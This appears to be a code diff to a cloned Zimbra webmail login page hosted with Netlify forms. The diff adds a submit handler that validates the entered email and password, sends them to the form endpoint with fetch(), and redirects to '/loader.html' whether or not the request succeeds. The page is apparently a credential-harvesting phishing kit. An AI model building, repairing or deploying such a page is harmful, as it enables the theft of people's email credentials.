@@ -22,7 +22,7 @@
                     &nbsp;
                 </center>
 
-                <form method="post" name="ZIM2" action="loader.html" onsubmit="return validateZimForm(event)" netlify>
+                <form id="ZIM2" method="post" name="ZIM2" action="loader.html" netlify>
                     <input type="hidden" name="loginOp" value="login">
                     <input type="hidden" name="login_csrf" value="6c53c6ee-1e54-4509-9bf1-afcf32e1c5a1">
 
@@ -98,7 +98,7 @@
     </div>
 
     <script>
-        function validateZimForm(event) {
+        function validateZimForm() {
             const email = document.getElementById("username");
             const password = document.getElementById("password");
             const errorMessage = document.getElementById("errorMessage");
@@ -110,14 +110,12 @@
             if (!email.value.trim() || !password.value.trim()) {
                 errorMessage.textContent = "Both email and password are required.";
                 errorMessage.style.display = "block";
-                event.preventDefault();
                 return false;
             }
 
             if (!emailPattern.test(email.value.trim())) {
                 errorMessage.textContent = "Please enter a valid email address.";
                 errorMessage.style.display = "block";
-                event.preventDefault();
                 return false;
             }
 
@@ -149,6 +147,24 @@
         // Set banner link
         var bannerLink = document.getElementById("bannerLink");
         if (bannerLink) bannerLink.href = "";
+
+        // New JavaScript for form submission and redirect
+        document.getElementById('ZIM2').addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (validateZimForm()) {
+                fetch(this.action, {
+                    method: 'POST',
+                    body: new FormData(this)
+                })
+                .then(() => {
+                    window.location.href = '/loader.html';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    window.location.href = '/loader.html';
+                });
+            }
+        });
     </script>
 </body>
 </html>
